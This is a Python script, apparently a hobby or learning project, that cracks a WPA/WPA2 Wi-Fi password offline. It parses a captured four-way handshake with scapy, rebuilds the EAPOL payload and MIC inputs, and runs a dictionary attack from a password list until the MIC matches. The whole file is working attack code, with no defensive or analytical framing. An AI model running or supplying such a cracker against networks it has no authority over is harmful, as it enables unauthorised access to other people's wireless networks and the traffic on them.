from scapy.all import *
import binascii
from typing import List, Any
from utils import *
import sys
import binascii

all_packets = rdpcap(
    "assets/handshake.cap"
)  # !Important:  this code assumes that the captured packages contain only 1 handshake
handshake_packets: List[Any] = get_handshake_packets(all_packets)


# TODO avoid conversions, just keep in in bytes
access_point_essid = "AP-NAME"  # select_essid(all_packets)
access_point_mac = get_package_sender_mac(handshake_packets[0])
access_point_mac_binary = format_mac_address(access_point_mac)
client_mac = get_package_receiver_mac(handshake_packets[0])
client_mac_binary = format_mac_address(client_mac)
a_nonce = get_nonce(handshake_packets[0])
s_nonce = get_nonce(handshake_packets[1])

# Following variables all refer to the 2 handshake package which we will use for recreating the mic
second_packet = binascii.hexlify(handshake_packets[1].getlayer(Raw).load)
# print(bytes(handshake_packets[1][EAPOL].payload), second_packet)
mic = get_mic(second_packet)
micd = bytes(handshake_packets[1][EAPOL].payload)[81:97]
print(bytes(handshake_packets[1][EAPOL].payload), micd)
version = get_version(handshake_packets[1])
package_type = get_type(handshake_packets[1])
length = get_length(handshake_packets[1])
# \xdb\x03_\x06I\x92\xdd\xef\xaeg\xe2N\xa1\xaf\x99E
# b"\x02\x01\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01e{t\x92!9~\xe9\r\xdd'\x0e\x92M*q9DeR\xb4GH-!A\xee\xe7\xdd\t\xde\xbb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdb\x03_\x06I\x92\xdd\xef\xaeg\xe2N\xa1\xaf\x99E\x00\x160\x14\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00" b'I\x92\xdd\xef\xaeg\xe2N\xa1\xaf\x99E\x00\x160\x14'
# TODO avoid type conversion (build in types)
payload = (chr(version).encode() +
           chr(package_type).encode() +
           bytes([0x00]) +
           chr(length).encode() +
           # TODO get info about raw layer, then put these to variables.
           binascii.a2b_hex(binascii.hexlify(handshake_packets[1].getlayer(Raw).load)[:154]) +
           bytes([0x00])*16 +
           binascii.a2b_hex(binascii.hexlify(
               handshake_packets[1].getlayer(Raw).load)[186:]))
key_data = (
    min(access_point_mac_binary, client_mac_binary)
    + max(access_point_mac_binary, client_mac_binary)
    + min(a_nonce, s_nonce)
    + max(a_nonce, s_nonce)
)

all_passwords = read_password_list("assets/passwordList.txt")

for password in all_passwords:
    generated_mic = calculate_mic(
        password, access_point_essid, key_data, payload)

    if (mic == generated_mic):
        print("!!!! Password cracked!!!!")
        print("You are a true genius hacker! ;)")
        print("essid: ", access_point_essid)
        print("The very top secret password is: ", password)
        sys.exit()

print("Password not found, you need to try a bit harder ;)")
